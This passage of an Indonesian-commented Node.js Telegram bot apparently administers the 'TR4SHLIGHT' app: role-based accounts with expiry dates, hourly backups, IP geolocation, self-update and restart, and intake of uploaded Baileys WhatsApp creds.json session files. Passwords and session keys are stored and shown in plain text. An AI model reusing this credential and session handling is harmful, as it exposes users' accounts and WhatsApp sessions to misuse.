    const fullPath = path.join(dir, entry.name)
    const relPath = path.relative(baseDir, fullPath)

    if (entry.isDirectory()) {
      if (BACKUP_EXCLUDE_DIRS.includes(entry.name)) continue
      collectFilesForBackup(fullPath, baseDir, fileList)
    } else {
      fileList.push({ fullPath, relPath })
    }
  }

  return fileList
}

function createBackup() {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-')
  const backupFilename = `backup-${timestamp}.zip`
  const backupPath = path.join(BACKUP_DIR, backupFilename)

  const zip = new AdmZip()
  const files = collectFilesForBackup(__dirname)

  for (const file of files) {
    try {
      zip.addLocalFile(file.fullPath, path.dirname(file.relPath) === '.' ? '' : path.dirname(file.relPath))
    } catch (e) {
      console.error(`[BACKUP] Gagal tambah file ${file.relPath}:`, e.message)
    }
  }

  zip.writeZip(backupPath)

  const sizeKb = (fs.statSync(backupPath).size / 1024).toFixed(1)
  console.log(`\x1b[32m[BACKUP]\x1b[0m Berhasil: ${backupFilename} (${sizeKb} KB) | ${files.length} file`)

  return { path: backupPath, filename: backupFilename, sizeKb, fileCount: files.length }
}

const BACKUP_MAX_FILES = 24   // 24 backup terakhir (tiap 1 jam = bertahan 1 hari)

function cleanupOldBackups() {
  try {
    const files = fs.readdirSync(BACKUP_DIR)
      .filter(f => f.startsWith('backup-') && f.endsWith('.zip'))
      .map(f => ({
        name: f,
        path: path.join(BACKUP_DIR, f),
        time: fs.statSync(path.join(BACKUP_DIR, f)).mtime.getTime()
      }))
      .sort((a, b) => b.time - a.time)

    const toDelete = files.slice(BACKUP_MAX_FILES)
    for (const f of toDelete) {
      fs.unlinkSync(f.path)
      console.log(`\x1b[33m[BACKUP]\x1b[0m Hapus backup lama: ${f.name}`)
    }
  } catch (e) {
    console.error('[BACKUP] Cleanup error:', e.message)
  }
}

async function runBackupJob() {
  try {
    const result = createBackup()
    cleanupOldBackups()

    try {
      await bot.sendDocument(OWNER_ID, result.path, {
        caption: `🗂️ *AUTO BACKUP*\n\nFile: \`${result.filename}\`\nUkuran: ${result.sizeKb} KB\nTotal File: ${result.fileCount}\nWaktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`,
        parse_mode: 'Markdown'
      })
    } catch (e) {
      console.error('[BACKUP] Gagal kirim ke Telegram:', e.message)
    }
  } catch (e) {
    console.error('[BACKUP] Job error:', e.message)
  }
}

setInterval(runBackupJob, 60 * 60 * 1000)


console.log('🗂️ AUTO BACKUP SYSTEM LOADED (tiap 1 jam)')
// (Opsional) jalankan 1x saat server pertama kali nyala
// runBackupJob()
// =======================================================
// HANDLER TOMBOL ACC / TOLAK (KHUSUS OWNER)
// =======================================================
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  const id = query.from.id;
  const data = query.data;

  const isOwner = config.ownerList.includes(id);
  if (!isOwner) {
    return bot.answerCallbackQuery(query.id, "⚠️ Hanya Owner yang bisa menekan tombol ini!", { show_alert: true });
  }

  try {
    if (data.startsWith('seller_approve:')) {
      const storanId = data.split(':')[1];
      const result = approveSellerStoran(storanId, 'telegram');
      
      if (result.ok) {
        await bot.editMessageCaption(
          `✅ *AKUN STORAN DI-ACC*\n\n👤 Username: ${result.item.username}\n📦 Role: ${result.item.role}\n👔 Dibuat oleh: ${result.item.submittedBy}`, 
          { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[]] } }
        );
        bot.answerCallbackQuery(query.id, "Akun berhasil di-ACC!").catch(()=>{});
      } else {
        bot.answerCallbackQuery(query.id, result.error || "Gagal", { show_alert: true }).catch(()=>{});
      }
    }

    if (data.startsWith('seller_reject:')) {
      const storanId = data.split(':')[1];
      const result = rejectSellerStoran(storanId, 'telegram');
      
      if (result.ok) {
        await bot.editMessageCaption(
          `❌ *AKUN STORAN DITOLAK*\n\n👤 Username: ${result.item.username}\n📝 Alasan: ${result.item.rejectReason}`, 
          { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[]] } }
        );
        bot.answerCallbackQuery(query.id, "Storan ditolak.").catch(()=>{});
      } else {
        bot.answerCallbackQuery(query.id, result.error || "Gagal", { show_alert: true }).catch(()=>{});
      }
    }
  } catch (error) {
    console.error('[TG CALLBACK ERROR]', error.message);
    bot.answerCallbackQuery(query.id, "Error").catch(()=>{});
  }
});
bot.onText(/\/ownermenu/, (msg) => {
  if (msg.from.id !== OWNER_ID) return;

  bot.sendMessage(msg.chat.id,
    '<blockquote>Owner Menu</blockquote>\n\n'
    + '/clear\n'
    + '/restarti\n'
    + '/ping\n'
    + '/addowner\n'
    + '/update\n'
    + '/backup\n'
    + '/delowner',
    { parse_mode: 'HTML' }
  );
});

// --- Handler /start atau /menu ---
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.chat.id;
  const username = msg.from.username;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;
  
  let text = `Hii ${username},Selamat Datang Di Bot Database Aplikasi TR4SHLIGHT, Silahkan Memilih Menu Di Bawah`

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");


  // Tombol yang kamu minta, TAMBAHAN TOMBOL SETTING GRUP
  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buat Akun Member", callback_data: "create_member", style : "danger" }],
        [{ text: "Buat Akun Reseller", callback_data: "create_reseller", style : "danger" }],
        [{ text: "Buat Akun Owner", callback_data: "create_owner", style : "danger" }],
        [{ text: "Buat Akun VIP", callback_data: "create_vip", style : "danger" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire", style : "danger" }],
        ...(isOwner ? [[
          { text: "📋 List User", callback_data: "list_user", style : "danger" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom", style : "danger" },
          { text: "🗑 Hapus User", callback_data: "delete_user", style : "danger" }, 
        ]] : [])
      ]
    }
  };

  bot.sendPhoto(id, "https://l.top4top.io/p_3781yxi011.jpg", {
  caption: text, 
  reply_markup: options.reply_markup});
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;
      
     case "create_vip":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "vip", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun VIP dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "create_reseller":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "reseller", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun Reseller dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;
     
    case "create_owner":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "owner", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun Owner dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;


    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://localhost:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*TR4SHLIGHT Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Darkness-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

// === Fitur Track IP ===
bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    // Kirim peta lokasi (jika ada koordinat)
    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ===== Fitur reset akun by role =====
// Usage:
// 1) /resetakunmember        -> bot akan menanyakan konfirmasi
// 2) /resetakunmember yes    -> konfirmasi, lalu hapus semua akun role 'member'
// Sama untuk: resetakunowner, resetakunreseller, resetakunvip
// Untuk hapus semua akun: /resetall yes
// NOTE: hanya telegram owner (config.ownerList) yang boleh menjalankan.
// === FITUR RESET AKUN DENGAN BUTTON KONFIRMASI (HANYA ID KAMU) ===
// 🔐 Ganti dengan ID Telegram kamu

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// 🔘 Command reset dengan tombol konfirmasi
function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  // Handle klik tombol konfirmasi
  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

// 🔹 Daftarkan semua perintah
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// === FITUR /INFO <username> ===
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    // cari data akun
    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    // ambil data dari database.json
    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    // ambil data dari keyList.json
    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}


const { spawn, execSync } = require('child_process');

// ========================
// KONFIGURASI
// ========================
const JSON_PATH = path.join(__dirname, 'telegram.json');
const WORK_DIR = __dirname;
const PM2_APP_NAME = process.env.PM2_APP_NAME || 'bot';

// ========================
// UTILITAS JSON
// ========================
function readConfig() {
  try {
    const raw = fs.readFileSync(JSON_PATH, 'utf-8');
    return JSON.parse(raw);
  } catch (err) {
    return { ownerList: [], userList: [] };
  }
}

function writeConfig(data) {
  try {
    fs.writeFileSync(JSON_PATH, JSON.stringify(data, null, 2) + '\n', 'utf-8');
    return true;
  } catch (err) {
    return false;
  }
}

function isOwner(userId) {
  const config = readConfig();
  return config.ownerList.includes(Number(userId));
}

// ========================
// FITUR: RESTART
// ========================
function restartBot(chatId) {
  const currentPid = process.pid;
  const scriptPath = process.argv[1];
  const isPM2 = !!process.env.PM2_HOME || !!process.env.pm_id;

  const lastChatPath = path.join(WORK_DIR, '.last_restart_chat');
  fs.writeFileSync(lastChatPath, String(chatId), 'utf-8');

  if (isPM2) {
    try { execSync(`pm2 restart ${PM2_APP_NAME}`, { stdio: 'ignore' }); } 
    catch (e) {
      spawn(process.execPath, [scriptPath, '--restart-pid', String(currentPid)], {
        detached: true, stdio: 'ignore', env: { ...process.env }
      }).unref();
    }
  } else {
    spawn(process.execPath, [scriptPath, '--restart-pid', String(currentPid)], {
      detached: true, stdio: 'ignore', env: { ...process.env }
    }).unref();
  }

  setTimeout(() => process.exit(0), 1500);
}

function checkRestartFlag(bot) {
  const args = process.argv;
  const pidIndex = args.indexOf('--restart-pid');

  if (pidIndex !== -1 && args[pidIndex + 1]) {
    const oldPid = args[pidIndex + 1];
    const lastChatPath = path.join(WORK_DIR, '.last_restart_chat');
    
    if (fs.existsSync(lastChatPath)) {
      try {
        const chatId = fs.readFileSync(lastChatPath, 'utf-8').trim();
        if (chatId) {
          setTimeout(() => {
            bot.sendMessage(Number(chatId),
              `✅ *Update berhasil\\!*\n\n🆕 Bot sudah online kembali\n📦 PID lama: \`${oldPid}\`\n🆕 PID baru: \`${process.pid}\`\n⏰ ${new Date().toLocaleString('id-ID')}`,
              { parse_mode: 'Markdown' }
            ).catch(() => {});
          }, 2000);
        }
      } catch (e) {}
      fs.unlinkSync(lastChatPath);
    }
    args.splice(pidIndex, 2);
  }
}

// ========================
// HANDLER: /update (via reply file)
// ========================
bot.onText(/\/update/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, '❌ Akses ditolak\\!');
  }

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId,
      '❌ *Cara penggunaan:*\n\n1️⃣ Kirim file \\(misal: index\\.js\\)\n2️⃣ Reply file tersebut ketik /update'
    );
  }

  const document = msg.reply_to_message.document;
  const fileName = document.file_name;

  // Keamanan: cegah path traversal
  if (!fileName || fileName.includes('..') || fileName.startsWith('/')) {
    return bot.sendMessage(chatId, '❌ Nama file tidak valid\\!');
  }

  // Keamanan: pastikan cuma file .js / .json
  const allowedExt = ['.js', '.json'];
  const ext = path.extname(fileName).toLowerCase();
  if (!allowedExt.includes(ext)) {
    return bot.sendMessage(chatId, `❌ Hanya bisa update file ${allowedExt.join(' dan ')}\\!`);
  }

  const targetPath = path.join(WORK_DIR, fileName);
  const statusMsg = await bot.sendMessage(chatId, '🔄 Sedang mendownload \\& menimpa file\\.\\.\\.');

  try {
    // Backup file lama jika ada
    if (fs.existsSync(targetPath)) {
      const backupDir = path.join(WORK_DIR, 'backups');
      if (!fs.existsSync(backupDir)) fs.mkdirSync(backupDir, { recursive: true });
      const ts = new Date().toISOString().replace(/[:.]/g, '-');
      fs.copyFileSync(targetPath, path.join(backupDir, `${fileName}_${ts}`));
    }

    // Download dan timpa
    const fileLink = await bot.getFileLink(document.file_id);
    const response = await fetch(fileLink);
    if (!response.ok) throw new Error(`Gagal download: HTTP ${response.status}`);
    
    const buffer = Buffer.from(await response.arrayBuffer());
    fs.writeFileSync(targetPath, buffer);

    await bot.editMessageText(`✅ File berhasil ditimpa\\. Bot akan restart\\.\\.\\.`, {
      chat_id: chatId, message_id: statusMsg.message_id
    });

    setTimeout(() => restartBot(chatId), 1000);

  } catch (err) {
    bot.editMessageText(`❌ *Update gagal!*\n\n⚠️ ${err.message}`, {
      chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown'
    }).catch(() => {});
  }
});

// ========================
// HANDLER: /addowner
// ========================
bot.onText(/\/addowner (\d+)(?:\s+(.*))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetId = Number(match[1]);
  const note = match[2] ? match[2].trim() : null;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, '❌ Akses ditolak\\!');
  }

  const config = readConfig();

  if (config.ownerList.includes(targetId)) {
    return bot.sendMessage(chatId, `⚠️ ID tersebut sudah ada di owner list\\.`);
  }

  config.ownerList.push(targetId);

  if (writeConfig(config)) {
    let response = `✅ *Owner berhasil ditambahkan!*\n\n👤 ID: ${targetId}\n`;
    if (note) response += `📝 Catatan: ${note}\n`;
    response += `📋 Total owner: ${config.ownerList.length}\n\n📌 Daftar owner:\n`;
    config.ownerList.forEach((id, i) => { response += `  ${i + 1}. ${id}\n`; });
    bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
  } else {
    bot.sendMessage(chatId, '❌ Gagal menulis ke telegram\\.json');
  }
});

// /addowner tanpa argumen
bot.onText(/\/addowner$/, (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, '❌ Akses ditolak\\!');
  
  const config = readConfig();
  let text = `📌 *Cara pakai:*\n/addowner \\[ID\\] \\[catatan\\]\n\n📋 *Owner list \\(${config.ownerList.length}\\):*\n`;
  config.ownerList.forEach((id, i) => { text += `  ${i + 1}. ${id}\n`; });
  bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

// ========================
// HANDLER: /removeowner
// ========================
bot.onText(/\/delowner (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const targetId = Number(match[1]);

  if (!isOwner(userId)) return bot.sendMessage(chatId, '❌ Akses ditolak\\!');

  const config = readConfig();
  const index = config.ownerList.indexOf(targetId);

  if (index === -1) return bot.sendMessage(chatId, `⚠️ ID tersebut tidak ada di owner list\\.`);
  if (config.ownerList.length <= 1) return bot.sendMessage(chatId, '❌ Tidak bisa menghapus owner terakhir\\!');

  config.ownerList.splice(index, 1);
  writeConfig(config);

  let response = `✅ *Owner dihapus!*\n\n👤 ${targetId}\n📋 Total owner: ${config.ownerList.length}\n\n`;
  config.ownerList.forEach((id, i) => { response += `  ${i + 1}. ${id}\n`; });
  bot.sendMessage(chatId, response, { parse_mode: 'Markdown' });
});

// ========================
// ERROR HANDLING
// ========================
bot.on('polling_error', (err) => {
  console.error(`[POLLING ERROR] ${err.code}: ${err.message}`);
});


/// ================= COMMAND /PING, /STATS, /STATUS =================
bot.onText(/^\/?(ping|stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.", { parse_mode: 'HTML' });
  }

  try {
    // 1. PING TEST
    const pingStart = Date.now();
    await axios.get(`http://localhost:${PORT}/ping`);
    const ping = Date.now() - pingStart;
    
    let pingStatus, pingEmoji;
    if (ping < 50) { pingStatus = "Excellent"; pingEmoji = "🟢"; }
    else if (ping < 150) { pingStatus = "Good"; pingEmoji = "🟡"; }
    else if (ping < 300) { pingStatus = "Fair"; pingEmoji = "🟠"; }
    else { pingStatus = "Poor"; pingEmoji = "🔴"; }

    // 2. UPTIME
    const uptime = formatUptime(process.uptime());

    // 3. DATABASE & USERS
    let users = [];
    let dbSize = 0;
    try {
        if (fs.existsSync("database.json")) {
            const dbStat = fs.statSync("database.json");
            dbSize = (dbStat.size / 1024).toFixed(2);
            users = JSON.parse(fs.readFileSync("database.json"));
        }
    } catch (e) { users = []; }

    const totalUser = Array.isArray(users) ? users.length : Object.keys(users).length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;
    
    // 4. WA SESSION
    const connectedMess = Object.keys(typeof mess !== 'undefined' ? mess : {}).length || 0;
    const connectedBiz = Object.keys(typeof biz !== 'undefined' ? biz : {}).length || 0;
    const connectedNumbers = Object.keys(typeof activeConnections !== 'undefined' ? activeConnections : {}).length || 0;

    // ==========================================
    // 5. MEMORY (KHUSUS PROSES NODE.JS / PANEL)
    // ==========================================
    const mem = process.memoryUsage();
    const toMiB = (bytes) => (bytes / 1024 / 1024).toFixed(2);
    
    const memRss = toMiB(mem.rss);
    const memHeapUsed = toMiB(mem.heapUsed);
    const memHeapTotal = toMiB(mem.heapTotal);
    const memExternal = toMiB(mem.external);
    const memArrayBuffers = toMiB(mem.arrayBuffers);
    const memPercent = ((mem.heapUsed / mem.heapTotal) * 100).toFixed(2);

    // ==========================================
    // 6. CPU LOAD (KHUSUS PROSES NODE.JS / PANEL)
    // ==========================================
    let cpuPercent = "0.00";
    try {
        const { execSync } = require('child_process');
        const pid = process.pid;
        let cmd;
        if (os.platform() === 'win32') {
            cmd = `powershell "Get-Process -Id ${pid} | Select-Object -ExpandProperty CPU"`;
            const cpuTime = parseFloat(execSync(cmd, { encoding: 'utf8' }).trim()) || 0;
